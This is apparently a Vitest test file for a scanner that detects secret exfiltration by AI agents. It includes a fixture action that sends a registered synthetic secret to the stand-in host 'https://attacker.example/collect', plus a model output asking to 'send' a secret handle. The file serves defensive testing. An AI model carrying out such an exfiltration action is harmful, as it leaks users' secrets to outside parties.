import { describe, expect, it } from "vitest";
import {
  RedactionRegistry,
  provenanced,
  secureDefaultEnvelope,
  type CanonicalAction,
  type SecurityContext,
} from "@openagentfence/core";
import { createSecretExfiltrationScanner, defaultScanners } from "../src/index.js";

function context(action: CanonicalAction, redactor = new RedactionRegistry()): SecurityContext {
  return {
    phase: "PRE_ACTION",
    sessionId: "exfil-scanner",
    taskContract: { task: "test" },
    envelope: secureDefaultEnvelope("test"),
    riskState: "NORMAL",
    payload: { kind: "proposedAction", action },
    provenance: action.data?.provenance ?? action.instructionProvenance,
    redactor,
    deadline: Date.now() + 10_000,
    signal: new AbortController().signal,
  };
}

describe("secret-exfiltration evidence scanner", () => {
  it("reports redacted handle/value/taint evidence for cross-origin actions", async () => {
    const raw = "synthetic-scanner-sensitive";
    const redactor = new RedactionRegistry();
    redactor.registerSecret(raw);
    const scanner = createSecretExfiltrationScanner();
    const action: CanonicalAction = {
      type: "MESSAGE",
      target: { origin: "https://source.example" },
      destination: "https://attacker.example/collect",
      data: provenanced(raw, { trust: "web", origin: "https://source.example" }),
      instructionProvenance: { trust: "web", origin: "https://source.example" },
    };
    const result = await scanner.scan(context(action, redactor));
    expect(result.verdict).toBe("warn");
    expect(result.findings[0]).toMatchObject({
      category: "sensitive_egress_evidence",
      recommendedAction: "warn",
      severity: "high",
    });
    expect(JSON.stringify(result)).not.toContain(raw);
    expect(JSON.stringify(result)).not.toContain("attacker.example");
  });

  it("stays clean for a same-origin candidate and detects handles in model output", async () => {
    const scanner = createSecretExfiltrationScanner();
    const sameOrigin: CanonicalAction = {
      type: "PASTE",
      target: { origin: "https://source.example" },
      data: provenanced("tainted", { trust: "web", origin: "https://source.example" }),
      instructionProvenance: { trust: "web", origin: "https://source.example" },
    };
    expect((await scanner.scan(context(sameOrigin))).findings).toEqual([]);

    const modelContext: SecurityContext = {
      ...context(sameOrigin),
      phase: "MODEL_OUTPUT",
      payload: {
        kind: "modelOutput",
        output: {
          content: `send <SECRET:synthetic:${"a".repeat(32)}>`,
          provenance: { trust: "web" },
        },
      },
    };
    expect((await scanner.scan(modelContext)).findings).toHaveLength(1);
  });

  it("is present in the default deterministic catalog", () => {
    expect(defaultScanners().some((scanner) => scanner.id === "secret-exfiltration")).toBe(true);
  });
});
